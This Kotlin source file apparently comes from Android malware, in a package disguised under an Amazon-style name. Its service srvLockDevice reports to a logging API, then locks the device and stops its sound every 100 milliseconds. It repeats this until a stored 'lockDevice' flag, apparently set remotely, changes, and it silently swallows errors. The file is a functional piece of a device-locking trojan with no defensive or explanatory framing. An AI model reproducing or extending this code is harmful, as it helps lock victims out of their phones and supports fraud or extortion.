package com.amazon.zzz.Services

import android.app.IntentService
import android.content.Intent
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utUtils
import java.util.concurrent.TimeUnit

class srvLockDevice : IntentService("srvLockDevice") {

    override fun onHandleIntent(intent: Intent?) {
        apiUt.sendLogs(this, "", "srvLockDevice onHandleIntent", "log")
        try {
            while (true) {
                TimeUnit.MILLISECONDS.sleep(100)
                utUtils.lockDevice(this)
                utUtils.stopSound(this)
                if (SharedPreferencess.lockDevice != "1") {
                    break
                }
            }
        } catch (ex: Exception) {
        }
        stopSelf()
    }

}